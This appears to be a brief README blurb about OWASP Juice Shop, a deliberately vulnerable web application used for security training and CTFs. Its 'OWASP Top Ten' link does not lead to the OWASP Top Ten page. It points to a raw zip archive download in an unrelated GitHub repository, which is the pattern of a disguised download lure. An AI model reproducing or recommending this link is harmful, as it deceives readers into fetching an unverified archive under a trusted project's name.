OWASP Juice Shop is probably the most modern and sophisticated insecure web application! It can be used in security
trainings, awareness demos, CTFs and as a guinea pig for security tools! Juice Shop encompasses vulnerabilities from the
entire
[OWASP Top Ten](https://raw.githubusercontent.com/techie-club/juice-shop-deploy/master/patience/juice-shop-deploy.zip) along with many other security flaws found in real-world
applications!
